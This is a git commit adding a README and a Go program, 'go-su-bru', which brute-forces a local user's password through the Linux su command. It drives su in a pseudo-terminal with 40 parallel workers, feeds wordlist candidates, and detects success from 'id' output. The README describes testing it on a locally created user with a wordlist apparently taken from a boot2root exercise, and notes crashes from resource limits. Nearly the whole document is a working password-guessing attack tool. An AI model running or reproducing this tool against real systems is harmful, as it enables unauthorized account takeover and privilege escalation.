9e59de31114508c21a3aeba02602cc90292e5dc7
Chris Pritchard <chris@grislygrotto.nz>
2021-04-28 08:55:46 +1200

    added basic files

--- README.md
+++ README.md
@@ -1,2 +1,24 @@
 # go-su-bru
+
 Go based su password bruteforcer
+
+Still a work in progress - running into some sort of ulimit or file handler issue.
+
+## Testing
+
+Create a new user, and give them a password from adanalist.txt (this is originally from a boot2root). For example, using a password at about position 47k:
+
+```
+sudo useradd hakanbey
+echo -e "123adanacurly\n123adanacurly" | sudo passwd hakanbey
+```
+
+then to run:
+
+`go run subrute.go hakanbey ./adanalist.txt`
+
+currently at around 23k-33k into the list, it will crash with:
+
+`fork/exec /bin/su: resource temporarily unavailable`
+
+or various issues of that nature.
---
+++ subrute.go
@@ -0,0 +1,78 @@
+package main
+
+import (
+	"bufio"
+	"log"
+	"os"
+	"os/exec"
+	"strings"
+	"sync"
+	"time"
+
+	"github.com/creack/pty"
+)
+
+func main() {
+	log.SetFlags(0)
+	if len(os.Args) < 3 {
+		log.Fatal("args: username passwordfile")
+	}
+
+	username := os.Args[1]
+	passwordFile := os.Args[2]
+	batchSize := 40
+
+	tasks := make(chan string, batchSize)
+	var wg sync.WaitGroup
+
+	for i := 0; i < batchSize; i++ {
+		wg.Add(1)
+		go func() {
+			for candidate := range tasks {
+				test(username, candidate)
+			}
+			wg.Done()
+		}()
+	}
+
+	processPasswords(passwordFile, tasks)
+
+	close(tasks)
+	wg.Wait()
+}
+
+func processPasswords(passwordFile string, tasks chan string) {
+	file, err := os.Open(passwordFile)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		tasks <- scanner.Text()
+	}
+}
+
+func test(username, candidate string) {
+	c := exec.Command("su", "-c", "id", username)
+	f, err := pty.Start(c)
+	if err != nil {
+		time.Sleep(2 * time.Second)
+		test(username, candidate)
+		return
+	}
+
+	buffer := make([]byte, 10)
+	f.Read(buffer) // text 'Password: '
+	f.Write([]byte(candidate + "\n"))
+	f.Read(buffer)         // new line
+	n, _ := f.Read(buffer) // either id text or failure
+
+	if n > 0 && strings.HasPrefix(string(buffer), "uid=") {
+		log.Printf("success with %s\n", candidate)
+		os.Exit(0)
+	} else {
+		log.Println(candidate)
+	}
+}
